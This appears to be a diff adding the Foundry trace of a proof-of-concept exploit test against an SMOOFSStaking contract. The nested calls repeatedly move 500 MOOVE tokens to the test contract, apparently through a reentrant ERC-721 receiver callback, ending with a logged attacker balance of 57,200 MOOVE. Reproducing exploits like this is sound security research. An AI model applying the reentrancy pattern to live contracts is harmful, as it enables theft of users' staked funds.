+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000b954afe3afaab300000 → 0x000000000000000000000000000000000000000000000bb065e311dd9a800000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008f066ebfecc33c4ea28d → 0x000000000000000000000000000000000000000000008eeb53db15e04cfea28d
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 12: 1086 → 1085
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 32: 3 → 4
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2855 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 2854 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000bb065e311dd9a800000 → 0x000000000000000000000000000000000000000000000bcb80c7e8c089d00000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008eeb53db15e04cfea28d → 0x000000000000000000000000000000000000000000008ed038f63efd5daea28d
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 12: 1085 → 1084
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   @ 32: 2 → 3
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2855 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 2854 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   ├─ [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000bcb80c7e8c089d00000 → 0x000000000000000000000000000000000000000000000be69bacbfa379200000
+    │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008ed038f63efd5daea28d → 0x000000000000000000000000000000000000000000008eb51e11681a6e5ea28d
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   @ 12: 1084 → 1083
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 32: 1 → 2
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 2062
+    │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
+    │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 2854 → 0
+    │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 2062 → 0
+    │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2855 → 2854
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   ├─ [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000be69bacbfa379200000 → 0x000000000000000000000000000000000000000000000c01b691968668700000
+    │   │   │   │   │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008eb51e11681a6e5ea28d → 0x000000000000000000000000000000000000000000008e9a032c91377f0ea28d
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 12: 1083 → 1082
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 32: 0 → 1
+    │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
+    │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 2062 → 0
+    │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2855 → 2854
+    │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 2062
+    │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 2854 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20])
+    │   │   │   ├─ [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500000000000000000000 [5e20]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 500000000000000000000 [5e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008e9a032c91377f0ea28d → 0x000000000000000000000000000000000000000000008e7ee847ba548fbea28d
+    │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000c01b691968668700000 → 0x000000000000000000000000000000000000000000000c1cd1766d6957c00000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 12: 1082 → 1081
+    │   │   │   @ 0x86935f44ff27c626cca4651a451c8e1efe7133f7038398be5387e4f3c2a97546: 0x00000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600 → 0x00000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149602
+    │   │   │   @ 0x86935f44ff27c626cca4651a451c8e1efe7133f7038398be5387e4f3c2a97548: 0 → 0x0000000000000000000000000000000000000000000000000000000065df1afe
+    │   │   │   @ 13: 2848 → 2847
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 57200000000000000000000 [5.72e22]
+    │   └─ ← [Return] 57200000000000000000000 [5.72e22]
+    ├─ [834] MOOVE::decimals() [staticcall]
+    │   ├─ [389] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::decimals() [delegatecall]
+    │   │   └─ ← [Return] 18
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker MOOVE balance after exploit", val: 57200000000000000000000 [5.72e22], decimals: 18)
+    ├─  storage changes:
+    │   @ 0xf6a5b053ad16ba59832408acdcd10ecca1d9481579b851542c529cf24a206cf2: 0 → 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c
+    │   @ 0xf6a5b053ad16ba59832408acdcd10ecca1d9481579b851542c529cf24a206cf5: 0 → 1
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 831.05s (830.14s CPU time)
+
+Ran 1 test suite in 835.08s (831.05s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
